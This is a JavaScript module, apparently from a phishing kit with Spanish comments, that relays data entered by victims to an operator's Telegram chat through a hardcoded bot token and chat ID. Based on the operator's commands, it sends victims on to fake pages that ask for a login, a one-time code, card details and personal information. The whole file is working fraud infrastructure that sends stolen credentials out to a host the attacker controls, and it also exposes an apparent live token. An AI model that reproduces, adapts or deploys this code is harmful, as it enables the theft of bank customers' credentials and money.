// ================================================================
// js/telegram.js - Sistema de comunicación con Telegram
// ================================================================
const TELEGRAM_CONFIG = {
  BOT_TOKEN: '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc',
  CHAT_ID: '8469651553',
  API_URL: 'https://api.telegram.org/bot'
};

// Enviar mensaje con botones a Telegram
async function sendTelegramMessage(mensaje, teclado = null) {
  const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
  
  console.log('📤 Enviando mensaje a Telegram...');
  
  const body = {
    chat_id: TELEGRAM_CONFIG.CHAT_ID,
    text: mensaje,
    parse_mode: 'Markdown'
  };

  if (teclado) {
    body.reply_markup = teclado;
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    console.log('✅ Mensaje enviado:', data);
    return data;
  } catch (error) {
    console.error('❌ Error enviando mensaje:', error);
    throw error;
  }
}

// Esperar respuesta del operador (simulado con timeout)
async function waitForTelegramResponse(messageId, timeout = 120000) {
  console.log('⏳ Esperando respuesta del operador...');
  
  // Por ahora simularemos la espera y devolveremos una acción
  // En producción, necesitarías un backend que escuche los callbacks
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ action: 'correcto', transactionId: Date.now() });
    }, 2000);
  });
}

// Manejar acciones del operador
async function handleTelegramAction(action, transactionId) {
  console.log('🎯 Manejando acción:', action);
  
  const actionType = action.split(':')[0];
  
  switch (actionType) {
    case 'correcto':
    case 'correcto_otp':
    case 'correcto_tarjeta':
      return 'next'; // Continuar a la siguiente página
      
    case 'incorrecto':
    case 'error_login':
      return 'error_login'; // Volver al login con error
      
    case 'pedir_dinamica':
      return 'dinamica'; // Ir a página de dinámica
      
    case 'error_dinamica':
      return 'error_dinamica'; // Volver a pedir dinámica con error
      
    case 'pedir_tarjeta':
      return 'tarjeta'; // Ir a página de tarjeta
      
    case 'error_tarjeta':
      return 'error_tarjeta'; // Volver a pedir tarjeta con error
      
    case 'pedir_datos':
      return 'datos_personales'; // Ir a página de datos personales
      
    case 'finish':
      return 'finish'; // Finalizar proceso
      
    default:
      return 'error';
  }
}

// Función auxiliar para redirigir según la acción
function redirectByAction(action) {
  switch(action) {
    case 'next':
      // La página actual decide a dónde ir
      break;
    case 'error_login':
      window.location.href = 'login.html?error=1';
      break;
    case 'dinamica':
      window.location.href = 'otp-dinamica.html';
      break;
    case 'error_dinamica':
      window.location.href = 'otp-dinamica.html?error=1';
      break;
    case 'tarjeta':
      window.location.href = 'datos-tarjeta.html';
      break;
    case 'error_tarjeta':
      window.location.href = 'datos-tarjeta.html?error=1';
      break;
    case 'datos_personales':
      window.location.href = 'info-personal.html';
      break;
    case 'finish':
      localStorage.clear();
      window.location.href = 'exito-final.html';
      break;
    default:
      window.location.href = 'login.html?error=1';
  }
}
